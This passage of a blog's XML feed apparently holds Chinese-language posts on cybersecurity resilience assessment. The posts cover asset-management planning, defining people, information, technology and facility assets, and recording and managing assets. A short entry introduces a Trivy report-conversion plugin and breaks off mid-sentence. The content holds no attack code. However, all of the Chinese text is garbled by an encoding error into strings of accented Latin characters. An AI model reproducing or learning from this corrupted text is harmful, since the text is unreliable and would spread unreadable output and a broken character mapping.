å¦‚ä½•è¿›è¡Œä¼˜å…ˆçº§æ’åºå·¥ä½œ</h3><p>ä¸€æ—¦ç»„ç»‡å¯¹å…¶æœåŠ¡è¿›è¡Œäº†ä¼˜å…ˆçº§æ’åºå·¥ä½œï¼Œå°±åº”è¯¥<strong>ä½¿ç”¨ä¹‹å‰é€‰æ‹©çš„æ–‡æ¡£å·¥å…·æ¥è®°å½•è¿™äº›ä¿¡æ¯</strong>ã€‚</p><p>ç„¶åï¼Œ<strong>æŒ‰ç…§æ¯”ä¾‹ä¸ºå…¶æœ€é‡è¦çš„æœåŠ¡åˆ†é…èµ„æºå’Œé¢„ç®—</strong>ï¼Œä»¥è¿›è¡Œèµ„äº§è¯†åˆ«ç­‰éŸ§æ€§æ´»åŠ¨ã€‚</p><h2 id="0x05-å»ºç«‹ä¸€ä¸ªé€šç”¨çš„èµ„äº§çš„å®šä¹‰"><a href="#0x05-å»ºç«‹ä¸€ä¸ªé€šç”¨çš„èµ„äº§çš„å®šä¹‰" class="headerlink" title="0x05 å»ºç«‹ä¸€ä¸ªé€šç”¨çš„èµ„äº§çš„å®šä¹‰"></a>0x05 å»ºç«‹ä¸€ä¸ªé€šç”¨çš„èµ„äº§çš„å®šä¹‰</h2><p>ç»„ç»‡åœ¨äº†è§£äº†å®ç°å…¶ä½¿å‘½æ‰€éœ€è¦çš„æœåŠ¡ä¹‹åï¼Œéœ€è¦å®šä¹‰ä¸ºè¿™äº›æœåŠ¡æä¾›æ”¯æŒçš„èµ„æºã€‚<strong>èµ„æºæ˜¯æœåŠ¡è¿è¡Œæ‰€éœ€è¦çš„åŸå§‹ææ–™ï¼ŒåŒ…æ‹¬ï¼šäººå‘˜ã€ä¿¡æ¯ã€æŠ€æœ¯å’Œè®¾æ–½ã€‚</strong></p><h3 id="5-1-äººå‘˜"><a href="#5-1-äººå‘˜" class="headerlink" title="5.1 äººå‘˜"></a>5.1 äººå‘˜</h3><p>**äººå‘˜èµ„äº§æŒ‡çš„æ˜¯å¯¹ç»„ç»‡æœåŠ¡è¿›è¡Œæ“ä½œå’Œç›‘æ§çš„å…³é”®å‘˜å·¥ã€‚**ç»„ç»‡å†…éƒ¨çš„äººå‘˜ï¼ˆæœ‰æ—¶è¿˜åŒ…æ‹¬å¤–éƒ¨äººå‘˜ï¼‰è´Ÿè´£æ‰§è¡Œæµç¨‹å’Œç¨‹åºï¼Œä»¥ç¡®ä¿æœåŠ¡èƒ½å¤Ÿå®ç°ç»„ç»‡çš„ä½¿å‘½ã€‚</p><p><img src="/image/654.png" alt="è¡¨ 3ï¼šå†…éƒ¨å’Œå¤–éƒ¨çš„äººå‘˜èµ„äº§ç¤ºä¾‹" title="è¡¨ 3ï¼šå†…éƒ¨å’Œå¤–éƒ¨çš„äººå‘˜èµ„äº§ç¤ºä¾‹"></p><p>åœ¨è¯†åˆ«äººå‘˜èµ„äº§æ—¶ï¼Œç»„ç»‡<strong>åº”è€ƒè™‘æˆåŠŸè¿è¥ä¸€é¡¹æœåŠ¡æ‰€å¿…éœ€çš„å…³é”®è§’è‰²ï¼Œè€Œä¸æ˜¯å®é™…æ‹…ä»»è¯¥è§’è‰²çš„äºº</strong>ã€‚å»ºè®®æ¯ä¸ªè§’è‰²éƒ½åŒ…å«ä¸€ä¸ªæ˜ç¡®åˆ—å‡ºçš„èŒèƒ½æˆ–è´£ä»»æ¸…å•ï¼Œä»¥å±¥è¡Œè¯¥è§’è‰²çš„èŒè´£ã€‚</p><blockquote><p>ä¸ºæ¯ä¸ªè§’è‰²å®šä¹‰èŒèƒ½å°†å¸®åŠ©ç»„ç»‡ç¡®ä¿äººå‘˜å…·å¤‡è¶³å¤Ÿçš„èƒ½åŠ›æ¥æ‰§è¡Œè¯¥è§’è‰²ï¼Œå¹¶ä¸”å¯ä»¥æœ‰ä¸æ­¢ä¸€ä¸ªäººæ¥æ”¯æŒè¯¥è§’è‰²ã€‚è¿™ä¹Ÿæœ‰åŠ©äºåœ¨å‘ç°äººå‘˜ä¸è¶³æ—¶è¯†åˆ«åŸ¹è®­éœ€æ±‚ã€‚</p></blockquote><h3 id="5-2-ä¿¡æ¯"><a href="#5-2-ä¿¡æ¯" class="headerlink" title="5.2 ä¿¡æ¯"></a>5.2 ä¿¡æ¯</h3><p><strong>ä¿¡æ¯èµ„äº§æ˜¯æŒ‡ä»»ä½•åª’ä½“ä¸Šæ‰€éœ€çš„ã€ç”¨äºç»„ç»‡æœåŠ¡æˆåŠŸè¿è¡Œçš„ä¿¡æ¯æˆ–æ•°æ®</strong>ã€‚ä¿¡æ¯èµ„äº§ä¹Ÿå¯ä»¥æ˜¯æœåŠ¡çš„è¾“å‡ºæˆ–å‰¯äº§å“ã€‚</p><p><img src="/image/655.png" alt="è¡¨ 4ï¼šä¿¡æ¯èµ„äº§çš„ç¤ºä¾‹" title="è¡¨ 4ï¼šä¿¡æ¯èµ„äº§çš„ç¤ºä¾‹"></p><p>ä¿¡æ¯å¯ä»¥æ˜¯ä½æˆ–å­—èŠ‚ã€æ–‡ä»¶æˆ–æ–‡æ¡£ï¼Œä¹Ÿå¯ä»¥æ˜¯å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„é›†ä½“ä¿¡æ¯ã€‚<strong>ç»„ç»‡å¿…é¡»ç¡®å®šå®ƒå¸Œæœ›å®šä¹‰ä¿¡æ¯èµ„äº§çš„ç²’åº¦</strong>ã€‚</p><h3 id="5-3-æŠ€æœ¯"><a href="#5-3-æŠ€æœ¯" class="headerlink" title="5.3 æŠ€æœ¯"></a>5.3 æŠ€æœ¯</h3><h4 id="5-3-1-ä»€ä¹ˆæ˜¯æŠ€æœ¯èµ„äº§"><a href="#5-3-1-ä»€ä¹ˆæ˜¯æŠ€æœ¯èµ„äº§" class="headerlink" title="5.3.1 ä»€ä¹ˆæ˜¯æŠ€æœ¯èµ„äº§"></a>5.3.1 ä»€ä¹ˆæ˜¯æŠ€æœ¯èµ„äº§</h4><p><strong>æŠ€æœ¯èµ„äº§åŒ…æ‹¬è½¯ä»¶ã€ç¡¬ä»¶ã€å›ºä»¶ä»¥åŠä»»ä½•ç‰©ç†è¿æ¥</strong>ã€‚</p><h4 id="5-3-2-æŠ€æœ¯èµ„äº§åœ¨å“ªé‡Œ"><a href="#5-3-2-æŠ€æœ¯èµ„äº§åœ¨å“ªé‡Œ" class="headerlink" title="5.3.2 æŠ€æœ¯èµ„äº§åœ¨å“ªé‡Œ"></a>5.3.2 æŠ€æœ¯èµ„äº§åœ¨å“ªé‡Œ</h4><p>æŠ€æœ¯èµ„äº§å¯ä»¥ä½äºç»„ç»‡å†…çš„ä»»ä½•åœ°æ–¹ï¼Œç”±ç»„ç»‡å†³å®šå¦‚ä½•æè¿°è¿™äº›æŠ€æœ¯èµ„äº§ã€‚</p><h4 id="5-3-3-å¦‚ä½•è¯†åˆ«æŠ€æœ¯èµ„äº§"><a href="#5-3-3-å¦‚ä½•è¯†åˆ«æŠ€æœ¯èµ„äº§" class="headerlink" title="5.3.3 å¦‚ä½•è¯†åˆ«æŠ€æœ¯èµ„äº§"></a>5.3.3 å¦‚ä½•è¯†åˆ«æŠ€æœ¯èµ„äº§</h4><p>æ¨èä»ç½‘ç»œè®¾å¤‡çº§åˆ«å¼€å§‹ï¼Œåœ¨é‚£é‡Œå¯ä»¥è¯†åˆ«åˆ°å¸¸è§çš„ç½‘ç»œç»„ä»¶ï¼Œå¦‚è·¯ç”±å™¨ã€æœåŠ¡å™¨å’Œäº¤æ¢æœºã€‚</p><p>ç„¶åï¼Œç»§ç»­è¯†åˆ«ä¸ªäººè®¡ç®—è®¾å¤‡ï¼Œå¦‚å°å¼ç”µè„‘ã€ç¬”è®°æœ¬ç”µè„‘å’Œå¹³æ¿ç”µè„‘ã€‚</p><h4 id="5-3-4-æŠ€æœ¯è¯†åˆ«åº”è¯¥åšåˆ°ä»€ä¹ˆç¨‹åº¦"><a href="#5-3-4-æŠ€æœ¯è¯†åˆ«åº”è¯¥åšåˆ°ä»€ä¹ˆç¨‹åº¦" class="headerlink" title="5.3.4 æŠ€æœ¯è¯†åˆ«åº”è¯¥åšåˆ°ä»€ä¹ˆç¨‹åº¦"></a>5.3.4 æŠ€æœ¯è¯†åˆ«åº”è¯¥åšåˆ°ä»€ä¹ˆç¨‹åº¦</h4><p>å°†è®¾å¤‡å½’ç±»åˆ°å¹¿æ³›çš„ç±»åˆ«ä¸­ï¼Œä¸ºç»„ç»‡æä¾›äº†ä¸€ä¸ªåŸºç¡€ï¼Œä½¿å¾—ç»„ç»‡èƒ½å¤Ÿåœ¨å…¶åŸºç¡€è®¾æ–½ä¸­å”¯ä¸€åœ°è¯†åˆ«æ¯ä¸€å°è®¾å¤‡ã€‚</p><p>åŒæ—¶ï¼Œè¿™ä¹Ÿä¸ºç»„ç»‡è®¾å®šäº†ç®¡ç†çš„èŒƒå›´å’Œæ§åˆ¶è¾¹ç•Œï¼Œä»¥ä¾¿æ›´æœ‰æ•ˆåœ°è¿›è¡Œç®¡ç†å’Œç»´æŠ¤ã€‚</p><h3 id="5-4-è®¾æ–½"><a href="#5-4-è®¾æ–½" class="headerlink" title="5.4 è®¾æ–½"></a>5.4 è®¾æ–½</h3><p><strong>è®¾æ–½èµ„äº§æ˜¯æŒ‡ç»„ç»‡åœ¨æä¾›æˆ–æ‰§è¡ŒæœåŠ¡æ—¶æ‰€ä¾èµ–çš„ä»»ä½•ç‰©ç†åœºæ‰€</strong>ã€‚è®¾æ–½å¯ä»¥ç”±ç»„ç»‡æ‹¥æœ‰å’Œæ§åˆ¶ï¼Œä¹Ÿå¯ä»¥ç”±å¤–éƒ¨ä¸šåŠ¡ä¼™ä¼´æ§åˆ¶ã€‚</p><p><img src="/image/656.png" alt="è¡¨ 5ï¼šè®¾æ–½èµ„äº§çš„ç¤ºä¾‹" title="è¡¨ 5ï¼šè®¾æ–½èµ„äº§çš„ç¤ºä¾‹"></p><p>è®¾æ–½èµ„äº§å®¹çº³äº†å‰é¢è®¨è®ºçš„äººå‘˜ã€æŠ€æœ¯ä»¥åŠä¿¡æ¯èµ„äº§ï¼Œå¹¶ä¸”<strong>æ‰€æœ‰èµ„äº§çš„ä¿æŠ¤ç­–ç•¥å¿…é¡»è¿›è¡Œæ•´åˆ</strong>ã€‚</p><h2 id="0x06-è¾“å‡ºå†…å®¹"><a href="#0x06-è¾“å‡ºå†…å®¹" class="headerlink" title="0x06 è¾“å‡ºå†…å®¹"></a>0x06 è¾“å‡ºå†…å®¹</h2><table><thead><tr><th>è¾“å‡º</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æœåŠ¡ä¼˜å…ˆçº§åˆ—è¡¨</td><td>ä¸€ä¸ªæ¸…æ™°çš„ä¼˜å…ˆçº§åˆ—è¡¨ï¼Œæ˜ç¡®æ ‡è¯†å‡ºä»·å€¼æœ€é«˜çš„æœåŠ¡ã€‚</td></tr><tr><td>èµ„äº§å®šä¹‰</td><td>ç»„ç»‡çš„èµ„äº§è¢«æ˜ç¡®å®šä¹‰ï¼Œä»¥ä¾¿è´Ÿè´£è¯†åˆ«èµ„äº§çš„åˆ©ç›Šç›¸å…³è€…å¯ä»¥ä¸€è‡´åœ°è®°å½•å®ƒä»¬ã€‚</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>å®‰å…¨å»ºè®¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œå®‰å…¨éŸ§æ€§è¯„ä¼°ã€‘èµ„äº§ç®¡ç†é¢†åŸŸï¼ˆä¸€ï¼‰ï¼šæ¦‚è¿°</title>
    <link href="/2024/11/13/%E3%80%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9F%A7%E6%80%A7%E8%AF%84%E4%BC%B0%E3%80%91%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E9%A2%86%E5%9F%9F%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E6%A6%82%E8%BF%B0/"/>
    <url>/2024/11/13/%E3%80%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9F%A7%E6%80%A7%E8%AF%84%E4%BC%B0%E3%80%91%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E9%A2%86%E5%9F%9F%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-æ¦‚è¿°"><a href="#0x00-æ¦‚è¿°" class="headerlink" title="0x00 æ¦‚è¿°"></a>0x00 æ¦‚è¿°</h2><p>èµ„äº§ç®¡ç†çš„ç›®çš„åœ¨äºï¼šä¸ºç»„ç»‡å»ºç«‹ä¸€ä»½è¯¦å°½çš„é«˜ä»·å€¼èµ„äº§æ¸…å•ï¼Œå¹¶åˆ¶å®šè¿™äº›èµ„äº§åœ¨å…¶æ•´ä¸ªç”Ÿå‘½å‘¨æœŸä¸­çš„ç®¡ç†æ–¹å¼ï¼Œè¿™æ˜¯ç¡®ä¿ç»„ç»‡åœ¨æä¾›æ ¸å¿ƒæœåŠ¡æ—¶èƒ½å¤Ÿä¿æŒæŒç»­ç”Ÿäº§åŠ›çš„å…³é”®ã€‚</p><p>ä»»ä½•å¯¹è¿™äº›èµ„äº§è¿è¡Œçš„ä¸­æ–­äº‹ä»¶éƒ½æœ‰å¯èƒ½é˜»ç¢ç»„ç»‡å®ç°å…¶ä½¿å‘½ã€‚ä¸ºäº†åº”å¯¹æ½œåœ¨çš„å¹²æ‰°ï¼Œèµ„äº§ç®¡ç†ç­–ç•¥æ˜¾å¾—å°¤ä¸ºé‡è¦ï¼Œå®ƒæœ‰åŠ©äºè¯†åˆ«å¹¶é‡‡å–é€‚å½“çš„ç­–ç•¥ï¼Œç¡®ä¿èµ„äº§å³ä½¿åœ¨é­å—å¹²æ‰°äº‹ä»¶æœŸé—´ä¹Ÿèƒ½ä¿æŒç”Ÿäº§åŠ›ã€‚</p><p><strong>èµ„äº§ç®¡ç†é¢†åŸŸä¸“æ³¨äºç»„ç»‡å†…éƒ¨èµ„äº§çš„è®¡åˆ’ã€è¯†åˆ«ã€è®°å½•å’Œç®¡ç†è¿‡ç¨‹ã€‚</strong></p><p>å¦‚å›¾ 1 æ‰€ç¤ºï¼Œè¿™ä¸€æµç¨‹æ—¨åœ¨å¸®åŠ©ç»„ç»‡æ»¡è¶³å…¶èµ„äº§ç®¡ç†ç›®æ ‡ã€‚</p><p><img src="/image/647.png" alt="å›¾ 1ï¼šèµ„äº§ç®¡ç†çš„æµç¨‹" title="å›¾ 1ï¼šèµ„äº§ç®¡ç†çš„æµç¨‹"></p><p>æœ¬æŒ‡å—çš„æ ¸å¿ƒåœ¨äºæ˜ç¡®èµ„äº§å¦‚ä½•ä¸æ”¯æ’‘ç»„ç»‡å®ç°å…¶ä½¿å‘½çš„æœåŠ¡ç´§å¯†ç›¸è¿ã€‚ä¸ºäº†æœ‰æ•ˆåœ°è¿›è¡Œèµ„äº§ç®¡ç†ï¼Œç»„ç»‡éœ€åŠ¨å‘˜ä¸åŒå±‚çº§çš„ç®¡ç†è€…å’Œå‘˜å·¥å…±åŒå‚ä¸åˆ°èµ„äº§çš„è®¡åˆ’ã€è¯†åˆ«ã€è®°å½•å’Œç®¡ç†å·¥ä½œä¸­ã€‚</p><p>ä¸ºäº†æä¾›æ¸…æ™°çš„æŒ‡å¯¼ï¼Œä¸‹é¢çš„ä»è¾ƒé«˜çš„å±‚æ¬¡çªå‡ºå±•ç¤ºäº†èµ„äº§ç®¡ç†é¢†åŸŸçš„å…³é”®å·¥ä½œå†…å®¹ï¼Œå¹¶å¼•å¯¼è¯»è€…æ·±å…¥æŸ¥é˜…æœ¬æŒ‡å—ä¸­çš„ç›¸å…³ç»†èŠ‚ï¼Œä»¥ä¾¿æ›´å¥½åœ°ç†è§£å’Œæ‰§è¡Œèµ„äº§ç®¡ç†ç­–ç•¥ã€‚</p><h2 id="0x01-èµ„äº§ç®¡ç†è®¡åˆ’"><a href="#0x01-èµ„äº§ç®¡ç†è®¡åˆ’" class="headerlink" title="0x01 èµ„äº§ç®¡ç†è®¡åˆ’"></a>0x01 èµ„äº§ç®¡ç†è®¡åˆ’</h2><p>èµ„äº§ç®¡ç†èƒ½å¤Ÿä¸ºç»„ç»‡æä¾›ä»»æ„æ—¶é—´ç‚¹ä¸Šçš„åŸºç¡€è®¾æ–½å†…æ‰€æœ‰èµ„äº§çš„å¿«ç…§ï¼Œæ‰€ä»¥åˆ¶å®šå¹¶éµå¾ªè®¡åˆ’å¯¹äºé«˜æ•ˆåœ°ç®¡ç†èµ„äº§è‡³å…³é‡è¦ã€‚èµ„äº§ç®¡ç†è®¡åˆ’åº”è¯¥åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼š</p><ol><li><strong>èµ„äº§ç®¡ç†è®¡åˆ’è·å¾—æ”¯æŒ</strong>ï¼šèµ„äº§ç®¡ç†è®¡åˆ’éœ€è¦è·å¾—æ›´é«˜çº§åˆ«çš„ç®¡ç†å±‚çš„æ”¯æŒï¼Œä»¥ç¡®ä¿å…¶æµç¨‹æœ‰è¶³å¤Ÿçš„èµ„é‡‘å’Œäººå‘˜é…å¤‡å¹¶å¾—ä»¥æ‰§è¡Œï¼›</li><li><strong>è¯†åˆ«æœåŠ¡</strong>ï¼šè¯†åˆ«ç»„ç»‡æ‰€æ‰§è¡Œæˆ–æä¾›çš„æ‰€æœ‰å…³é”®ä¸šåŠ¡çš„æœåŠ¡ï¼›</li><li><strong>å¯¹æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åº</strong>ï¼šæ ¹æ®æœåŠ¡å› æ•…éšœè€Œä¸­æ–­æ‰€é€ æˆçš„å½±å“ï¼Œå¯¹æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åºï¼Œä»¥ä¾¿ç»„ç»‡å¯ä»¥é›†ä¸­èµ„æºç»´æŠ¤æ ¸å¿ƒä¸šåŠ¡æœåŠ¡ï¼›</li><li><strong>å»ºç«‹ä¸€ä¸ªé€šç”¨çš„èµ„äº§çš„å®šä¹‰</strong>ï¼šæœ€åï¼Œèµ„äº§ç®¡ç†è®¡åˆ’è¦æ±‚ç»„ç»‡åœ¨å…¶åŸºç¡€è®¾æ–½å†…å»ºç«‹ä¸€ä¸ªé€šç”¨çš„èµ„äº§çš„å®šä¹‰ã€‚</li></ol><p><img src="/image/643.png" alt="å›¾ 2ï¼šèµ„äº§ç®¡ç†è®¡åˆ’åº”è¯¥åŒ…æ‹¬çš„å†…å®¹" title="å›¾ 2ï¼šèµ„äº§ç®¡ç†è®¡åˆ’åº”è¯¥åŒ…æ‹¬çš„å†…å®¹"></p><blockquote><p>è¿™é‡Œçš„æœåŠ¡æŒ‡çš„æ˜¯ç»„ç»‡åœ¨æ‰§è¡Œå…¶èŒè´£æˆ–è¿›è¡Œç”Ÿäº§æ—¶ï¼Œæ‰€è¿›è¡Œçš„ä¸€ç³»åˆ—æ´»åŠ¨ã€‚</p></blockquote><h2 id="0x02-è¯†åˆ«èµ„äº§"><a href="#0x02-è¯†åˆ«èµ„äº§" class="headerlink" title="0x02 è¯†åˆ«èµ„äº§"></a>0x02 è¯†åˆ«èµ„äº§</h2><p>èµ„äº§è¯†åˆ«çš„å·¥ä½œä¸»è¦åŒ…æ‹¬è¯†åˆ«å…³é”®æœåŠ¡åŠæ‰€æ”¯æŒä¾èµ–çš„èµ„äº§ã€‚åœ¨è¿›è¡Œè¿™é¡¹å·¥ä½œæ—¶ï¼Œç»„ç»‡åº”è¯¥æ ¹æ®æ‰€è€ƒè™‘çš„å…³é”®æœåŠ¡çš„ç‰¹ç‚¹å’Œè¦æ±‚ï¼Œå°†è´£ä»»åˆ†é…ç»™åˆé€‚çš„ç»„ç»‡å±‚çº§ã€‚</p><p>æœ¬æŒ‡å—å°†èµ„äº§åˆ†ä¸ºäººå‘˜ã€ä¿¡æ¯ã€æŠ€æœ¯å’Œè®¾æ–½å…±å››ä¸ªç±»åˆ«ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™äº›èµ„äº§å¯èƒ½æ˜¯ç»„ç»‡å†…éƒ¨çš„ï¼Œä¹Ÿå¯èƒ½ä½äºå•†ä¸šä¼™ä¼´æˆ–å…¶ä»–å¤–éƒ¨å®ä½“ä¸­ã€‚èµ„äº§è¯†åˆ«çš„å·¥ä½œåº”è¯¥åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼š</p><ol><li><strong>æŒ‡å®šè´Ÿè´£è¯†åˆ«æ”¯æŒå…³é”®æœåŠ¡æ‰€éœ€èµ„äº§çš„è´£ä»»äººï¼›</strong></li><li><strong>è¯†åˆ«äººå‘˜èµ„äº§ï¼›</strong></li><li><strong>è¯†åˆ«ä¿¡æ¯èµ„äº§ï¼›</strong></li><li><strong>è¯†åˆ«æŠ€æœ¯èµ„äº§ï¼›</strong></li><li><strong>è¯†åˆ«è®¾æ–½èµ„äº§ã€‚</strong></li></ol><p><img src="/image/644.png" alt="å›¾ 3ï¼šèµ„äº§çš„è¯†åˆ«åº”è¯¥åŒ…æ‹¬çš„å†…å®¹" title="å›¾ 3ï¼šèµ„äº§çš„è¯†åˆ«åº”è¯¥åŒ…æ‹¬çš„å†…å®¹"></p><h2 id="0x03-è®°å½•èµ„äº§"><a href="#0x03-è®°å½•èµ„äº§" class="headerlink" title="0x03 è®°å½•èµ„äº§"></a>0x03 è®°å½•èµ„äº§</h2><p>ä¸€æ—¦è¿™äº›èµ„äº§è¢«è¯†åˆ«ï¼Œé‚£ä¹ˆå¯¹å®ƒä»¬è¿›è¡Œè®°å½•å°±å°¤ä¸ºé‡è¦äº†ã€‚èµ„äº§è®°å½•ä¸»è¦ä¸ºäº†äº†è§£ï¼š</p><ul><li>èµ„äº§ä¸ç»„ç»‡çš„å…³ç³»ï¼ˆä¾‹å¦‚ï¼šå†…éƒ¨æˆ–å¤–éƒ¨ï¼‰ï¼›</li><li>è°è´Ÿè´£è¯¥èµ„äº§ï¼›</li><li>èµ„äº§åœ¨é¢å¯¹å„ç§å¯èƒ½çš„ä¸­æ–­äº‹ä»¶æ—¶ï¼Œæ‰€å…·å¤‡çš„é˜²æŠ¤èƒ½åŠ›å’ŒéŸ§æ€§ï¼›</li><li>èµ„äº§å¯¹å…³é”®æœåŠ¡çš„é‡è¦æ€§ï¼›</li><li>èµ„äº§åœ¨å…¶ç”Ÿå‘½å‘¨æœŸä¸­å¯èƒ½é­å—çš„å˜åŠ¨æˆ–æ›´æ–°ï¼›</li></ul><p>è¿™ä»½æ–‡æ¡£é€šå¸¸åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼š</p><ol><li>èµ„äº§ç±»å‹ï¼ˆäººå‘˜ã€ä¿¡æ¯ã€æŠ€æœ¯æˆ–è®¾æ–½ï¼‰</li><li>èµ„äº§çš„æ•æ„Ÿæ€§åˆ†ç±»ï¼ˆé€šå¸¸ä»…é’ˆå¯¹ä¿¡æ¯èµ„äº§ï¼‰</li><li>èµ„äº§ä½ç½®ï¼ˆé€šå¸¸æ˜¯èµ„äº§ä¿ç®¡äººç®¡ç†èµ„äº§çš„åœ°æ–¹ï¼‰</li><li>èµ„äº§æ‰€æœ‰è€…å’Œä¿ç®¡äººï¼ˆç‰¹åˆ«æ˜¯å¦‚æœèµ„äº§ä½äºç»„ç»‡å¤–éƒ¨æ—¶ï¼‰</li></ol><p><img src="/image/645.png" alt="å›¾ 4ï¼šèµ„äº§è®°å½•åº”è¯¥åŒ…æ‹¬çš„ä¿¡æ¯" title="å›¾ 4ï¼šèµ„äº§è®°å½•åº”è¯¥åŒ…æ‹¬çš„ä¿¡æ¯"></p><h2 id="0x04-ç®¡ç†èµ„äº§"><a href="#0x04-ç®¡ç†èµ„äº§" class="headerlink" title="0x04 ç®¡ç†èµ„äº§"></a>0x04 ç®¡ç†èµ„äº§</h2><p>ç»„ç»‡ä¸ä»…éœ€è¦å¯¹å…¶èµ„äº§å’Œåº“å­˜è¿›è¡Œç®¡ç†ï¼Œè¿˜éœ€è¦é‡‡å–æªæ–½æ”¹è¿›èµ„äº§ç®¡ç†çš„æµç¨‹ã€‚</p><p>ç»„ç»‡åº”è¯¥é€‰æ‹©å¯¹åº”çš„å·¥å…·å’Œæ–¹æ³•ï¼ˆä¾‹å¦‚ï¼šé…ç½®æ•°æ®åº“ã€å›¾çº¸å’Œå˜æ›´æ§åˆ¶ç­‰ï¼‰æ¥å¯¹èµ„äº§è¿›è¡Œç®¡ç†ï¼Œå¹¶ç¡®å®šè¿™äº›å·¥å…·åœ¨å†…éƒ¨è¯¥å¦‚ä½•ä½¿ç”¨ã€‚ç®¡ç†èµ„äº§çš„å·¥ä½œåº”è¯¥åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼š</p><ol><li>è¯†åˆ«å˜æ›´æ ‡å‡†</li><li>å»ºç«‹å˜æ›´è®¡åˆ’</li><li>ç®¡ç†èµ„äº§å’Œåº“å­˜çš„å˜æ›´</li><li>å˜æ›´å‘ç”Ÿæ—¶æ›´æ–°èµ„äº§æ¸…å•</li><li>æ”¹è¿›æµç¨‹</li></ol><p><img src="/image/646.png" alt="å›¾ 5ï¼šèµ„äº§ç®¡ç†åº”è¯¥åŒ…æ‹¬çš„å†…å®¹" title="å›¾ 5ï¼šèµ„äº§ç®¡ç†åº”è¯¥åŒ…æ‹¬çš„å†…å®¹"></p><h2 id="0x05-æ€»ç»“"><a href="#0x05-æ€»ç»“" class="headerlink" title="0x05 æ€»ç»“"></a>0x05 æ€»ç»“</h2><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥è¯´æ˜å®æ–½ä¸Šè¿°èµ„äº§ç®¡ç†æµç¨‹è§„åˆ’çš„æ­¥éª¤ï¼Œå·²ç»æ‹¥æœ‰èµ„äº§ç®¡ç†è®¡åˆ’çš„ç»„ç»‡å¯ä»¥é€šè¿‡ä½¿ç”¨æœ¬èµ„æºæŒ‡å—ä¸­çš„æŒ‡å¯¼æ¥è¯„ä¼°å’Œæ”¹è¿›å…¶è®¡åˆ’ã€‚</p><ol><li><p>èµ„äº§ç®¡ç†è®¡åˆ’</p><ol><li><p>èµ„äº§ç®¡ç†è®¡åˆ’è·å¾—æ”¯æŒ</p></li><li><p>è¯†åˆ«æœåŠ¡</p></li><li><p>å¯¹æœåŠ¡è¿›è¡Œä¼˜å…ˆçº§æ’åº</p></li><li><p>å»ºç«‹ä¸€ä¸ªé€šç”¨çš„èµ„äº§çš„å®šä¹‰</p></li></ol></li><li><p>è¯†åˆ«èµ„äº§</p><ol><li>å®šè´Ÿè´£è¯†åˆ«æ”¯æŒå…³é”®æœåŠ¡æ‰€éœ€èµ„äº§çš„è´£ä»»äºº</li><li>è¯†åˆ«äººå‘˜èµ„äº§</li><li>è¯†åˆ«ä¿¡æ¯èµ„äº§</li><li>è¯†åˆ«æŠ€æœ¯èµ„äº§</li><li>è¯†åˆ«è®¾æ–½èµ„äº§</li></ol></li><li><p>è®°å½•èµ„äº§</p><ol><li>åˆ›å»ºèµ„äº§æ¸…å•</li><li>è®°å½•èµ„äº§ä¸å…³é”®æœåŠ¡ä¹‹é—´çš„å…³ç³»</li><li>åˆ†ææ”¯æŒå¤šé¡¹æœåŠ¡çš„èµ„äº§ä¹‹é—´çš„ä¾èµ–å…³ç³»</li><li>æ›´æ–°èµ„äº§æ¸…å•</li></ol></li><li><p>ç®¡ç†èµ„äº§</p><ol><li>è¯†åˆ«å˜æ›´æ ‡å‡†</li><li>å»ºç«‹å˜æ›´è®¡åˆ’</li><li>ç®¡ç†èµ„äº§å’Œåº“å­˜çš„å˜æ›´</li><li>å˜æ›´å‘ç”Ÿæ—¶æ›´æ–°èµ„äº§æ¸…å•</li><li>æ”¹è¿›æµç¨‹</li></ol></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>å®‰å…¨å»ºè®¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Trivy æŠ¥å‘Šç”Ÿæˆæ’ä»¶ï¼štrivy-plugin-report</title>
    <link href="/2024/10/24/Trivy-%E6%8A%A5%E5%91%8A%E7%94%9F%E6%88%90%E6%8F%92%E4%BB%B6%EF%BC%9Atrivy-plugin-report/"/>
    <url>/2024/10/24/Trivy-%E6%8A%A5%E5%91%8A%E7%94%9F%E6%88%90%E6%8F%92%E4%BB%B6%EF%BC%9Atrivy-plugin-report/</url>
    
    <content type="html"><![CDATA[<p>ğŸ“Š <code>trivy-plugin-report</code> æ˜¯ä¸€ä¸ªå¯ä»¥å°† <a href="https://github.com/aquasecurity/trivy">Trivy</a> è¾“å‡ºçš„ JSON æ ¼å¼çš„æŠ¥å‘Šè½¬æ¢ä¸º EXCEL å’Œ Markdown çš„æ’ä»¶ã€‚</p><h2 id="ğŸ¤”-ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ"><a href="#ğŸ¤”-ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ" class="headerlink" title="ğŸ¤” ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ"></a>ğŸ¤” ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</h2><p>Trivy å¯ä»¥è¾“å‡ºå¤šç§æ 